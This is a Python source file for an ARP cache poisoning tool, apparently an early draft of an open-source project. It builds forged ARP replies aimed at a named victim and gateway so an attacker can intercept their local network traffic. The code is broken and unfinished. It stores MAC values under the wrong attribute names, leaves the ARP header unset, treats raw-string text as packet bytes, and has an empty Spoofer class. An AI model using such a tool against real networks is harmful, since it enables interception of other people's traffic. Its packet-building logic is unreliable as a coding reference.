#!/usr/bin/env python3
# https://github.com/EONRaider/Arp-Spoofer

__author__ = 'EONRaider @ keybase.io/eonraider'

"""
A low-level ARP cache poisoning (a.k.a "ARP spoofing") tool.
"""

import argparse
import re
import socket


class ARPPacket(object):

    def __init__(self, attacker_mac: str, gateway_mac: str, victim_mac: str,
                 gateway_ip: str, victim_ip: str):
        self.gateway_ip = socket.inet_aton(gateway_ip)
        self.victim_ip = socket.inet_aton(victim_ip)

        for attr in attacker_mac, gateway_mac, victim_mac:
            setattr(self, attr, self._hexlify_mac(attr))

        ETHER_T = r'\x08\x06'  # Ethertype code of ARP
        self.gateway_eth_header = self.gateway_mac + self.attacker_mac + ETHER_T
        self.victim_eth_header = self.victim_mac + self.attacker_mac + ETHER_T

        self.arp_header = None
        self.gateway_arp_packet = None
        self.victim_arp_packet = None

    @staticmethod
    def _hexlify_mac(mac_addr: str) -> str:
        """
        Transform a MAC address string from IEEE 802 standard to a
        sequence of hexadecimal bytes.
        Ex: 'AB:BC:CD:12:23:34' to '\xAB\xBC\xCD\x12\x23\x34'.
        """
        return re.sub(r'^|[:-]', r'\\x', mac_addr)

    def get_packets(self) -> tuple:
        self.gateway_arp_packet = r''.join((self.gateway_eth_header,
                                            self.arp_header,
                                            self.attacker_mac,
                                            self.victim_ip,
                                            self.gateway_mac,
                                            self.gateway_ip))
        self.victim_arp_packet = r''.join((self.victim_eth_header,
                                           self.arp_header,
                                           self.attacker_mac,
                                           self.gateway_ip,
                                           self.victim_mac,
                                           self.victim_ip))
        return self.gateway_arp_packet, self.victim_arp_packet


class Spoofer(object):
    def __init__(self):
        pass

    def execute(self):
        pass


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Execute ARP cache poisoning attacks (a.k.a "ARP '
                    'spoofing") on local networks.')
    parser.add_argument('interface', type=str,
                        help='Interface on the attacker machine to '
                             'send/receive packets from.')
    parser.add_argument('--attacker-mac', type=str, required=True,
                        help='MAC address of the network interface controller '
                             'used by the attacker.')
    parser.add_argument('--gate-mac', type=str, required=True,
                        help='MAC address of the network interface controller '
                             'of the gateway.')
    parser.add_argument('--victim-mac', type=str, required=True,
                        help='MAC address of the network interface controller '
                             'of the victim.')
    parser.add_argument('--gate-ip', type=str, required=True,
                        help='IP address of the gateway.')
    parser.add_argument('--victim-ip', type=str, required=True,
                        help='IP address of the victim.')
